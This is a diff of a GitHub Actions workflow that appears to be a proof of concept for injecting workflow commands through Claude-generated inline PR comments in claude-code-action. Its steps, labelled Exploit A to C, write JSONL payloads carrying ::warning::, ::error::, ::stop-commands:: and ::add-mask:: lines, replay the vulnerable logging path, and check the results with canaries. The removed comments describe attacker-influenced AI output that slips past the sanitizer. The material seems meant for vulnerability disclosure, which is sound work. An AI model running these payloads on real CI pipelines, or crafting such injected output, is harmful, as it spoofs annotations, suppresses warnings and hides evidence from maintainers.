@@ -10,66 +10,78 @@ jobs:
     runs-on: ubuntu-latest
     steps:
 
-      # ── Step 1: Create the JSONL buffer simulating what github-inline-comment-server.ts writes ──
-      # In the real target (claude-code-action), Claude generates inline comments
-      # whose `body` field can contain embedded newlines. The body is sanitized
-      # by sanitizeContent() which strips HTML comments, invisible chars, image
-      # alt text, link titles, hidden attributes, and redacts GitHub tokens —
-      # but does NOT strip newline characters or `::` workflow command prefixes.
-      - name: "Setup: Create malicious JSONL buffer (simulates attacker-influenced Claude output)"
+      # ── Step 1: Create JSONL buffers for each test scenario ──
+      - name: "Setup: Create JSONL buffers"
         run: |
-          # Payload 1: ::warning:: injection via embedded newline
-          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/index.ts","line":10,"body":"Test probe comment\\n::warning::INJECTED-BY-ATTACKER: This annotation was injected via workflow command","confirmed":null}\n' > /tmp/inline-comments-buffer.jsonl
+          # Scenario A: warning + error injection
+          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/index.ts","line":10,"body":"Test probe comment\\n::warning::INJECTED-BY-ATTACKER: This annotation was injected via workflow command","confirmed":null}\n' > /tmp/buffer-inject.jsonl
+          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/utils.ts","line":20,"body":"Testing tool\\n::error file=src/utils.ts,line=1::INJECTED-ERROR: Attacker-controlled error annotation","confirmed":null}\n' >> /tmp/buffer-inject.jsonl
 
-          # Payload 2: ::error:: injection
-          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/utils.ts","line":20,"body":"Testing tool\\n::error file=src/utils.ts,line=1::INJECTED-ERROR: Attacker-controlled error annotation","confirmed":null}\n' >> /tmp/inline-comments-buffer.jsonl
+          # Scenario B: stop-commands — put it FIRST, then a warning AFTER
+          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/a.ts","line":1,"body":"Probe\\n::stop-commands::attacker-token-xyz","confirmed":null}\n' > /tmp/buffer-stop.jsonl
+          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/b.ts","line":2,"body":"Another probe\\n::warning::THIS-SHOULD-BE-SUPPRESSED-BY-STOP-COMMANDS","confirmed":null}\n' >> /tmp/buffer-stop.jsonl
 
-          # Payload 3: ::stop-commands:: to disable all subsequent workflow commands
-          printf '{"ts":"2025-01-01T00:00:02Z","path":"src/main.ts","line":30,"body":"Check function\\n::stop-commands::attacker-token-abc123","confirmed":null}\n' >> /tmp/inline-comments-buffer.jsonl
+          # Scenario C: add-mask to hide evidence in logs
+          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/c.ts","line":1,"body":"Check\\n::add-mask::SENSITIVE-OPERATION-EVIDENCE","confirmed":null}\n' > /tmp/buffer-mask.jsonl
 
-          echo "Buffer contents (raw bytes):"
-          xxd /tmp/inline-comments-buffer.jsonl | head -40
-          echo "---"
-          echo "Buffer contents (text):"
-          cat /tmp/inline-comments-buffer.jsonl
-
-      # ── Step 2: Faithful reproduction of post-buffered-inline-comments.ts lines 200-206 ──
-      # This Node.js script exactly mirrors the vulnerable code path:
-      #   1. readFileSync → split → JSON.parse  (lines 149-158)
-      #   2. console.log of body.slice(0, 120)    (line 205)
-      - name: "Exploit: Reproduce vulnerable console.log path (mirrors post-buffered-inline-comments.ts:200-206)"
+      # ── Step 2: Demonstrate ::warning:: and ::error:: injection ──
+      - name: "Exploit A: warning + error injection (mirrors post-buffered-inline-comments.ts:200-206)"
         run: |
           node -e '
           const fs = require("fs");
-          const BUFFER_PATH = "/tmp/inline-comments-buffer.jsonl";
-          const raw = fs.readFileSync(BUFFER_PATH, "utf8");
-          const comments = raw.split("\n").filter(Boolean).map(line => JSON.parse(line));
-
-          console.log("Found " + comments.length + " buffered inline comment(s)");
-
-          // Simulate: all comments classified as "test/probe" by Haiku (filtered array)
+          const comments = fs.readFileSync("/tmp/buffer-inject.jsonl", "utf8")
+            .split("\n").filter(Boolean).map(line => JSON.parse(line));
           const filtered = comments;
-
-          // ── This is the EXACT vulnerable code from line 200-206 ──
           if (filtered.length > 0) {
-            console.log(
-              "::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:"
-            );
+            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
             for (const c of filtered) {
               console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
             }
           }
           '
 
-      # ── Step 3: Verification — can subsequent workflow commands still function? ──
-      # If ::stop-commands:: was processed, this ::warning:: will NOT appear as an annotation
-      - name: "Verify: This warning should be suppressed if ::stop-commands:: was processed"
+      # ── Step 3: Demonstrate ::stop-commands:: suppression WITHIN SAME STEP ──
+      - name: "Exploit B: stop-commands suppression (all in one step)"
         run: |
-          echo "::warning::POST-EXPLOIT-CANARY: If you see this as an annotation, stop-commands did NOT fire"
-          echo "If the above line appears as plain text (not a warning annotation), ::stop-commands:: was processed successfully"
+          node -e '
+          const fs = require("fs");
+          const comments = fs.readFileSync("/tmp/buffer-stop.jsonl", "utf8")
+            .split("\n").filter(Boolean).map(line => JSON.parse(line));
+          const filtered = comments;
+          if (filtered.length > 0) {
+            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
+            for (const c of filtered) {
+              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
+            }
+          }
 
-      # ── Step 4: Clean control — show normal workflow commands work in isolation ──
-      - name: "Control: Normal workflow commands in a fresh step (unaffected by stop-commands)"
+          // After the loop, emit a CANARY warning in the SAME node process / same step
+          console.log("::warning::CANARY-AFTER-STOP: If this appears as annotation, stop-commands failed");
+          console.log("PLAINTEXT-CANARY: This line should always appear as plain text");
+          '
+
+      # ── Step 4: Demonstrate ::add-mask:: to hide strings in subsequent output ──
+      - name: "Exploit C: add-mask hides evidence in logs"
         run: |
-          echo "::warning::CONTROL-WARNING: This is a normal warning annotation in a separate step"
-          echo "::error::CONTROL-ERROR: This is a normal error annotation in a separate step"
+          node -e '
+          const fs = require("fs");
+          const comments = fs.readFileSync("/tmp/buffer-mask.jsonl", "utf8")
+            .split("\n").filter(Boolean).map(line => JSON.parse(line));
+          const filtered = comments;
+          if (filtered.length > 0) {
+            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
+            for (const c of filtered) {
+              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
+            }
+          }
+          '
+
+          # After the mask is set, try to log the masked string
+          echo "Attempting to log: SENSITIVE-OPERATION-EVIDENCE"
+          echo "If the above shows *** instead, the add-mask worked"
+
+      # ── Step 5: Control — verify normal annotations work ──
+      - name: "Control: Normal annotations in clean step"
+        run: |
+          echo "::warning::CONTROL-WARNING: This is a legitimate warning"
+          echo "::error::CONTROL-ERROR: This is a legitimate error"
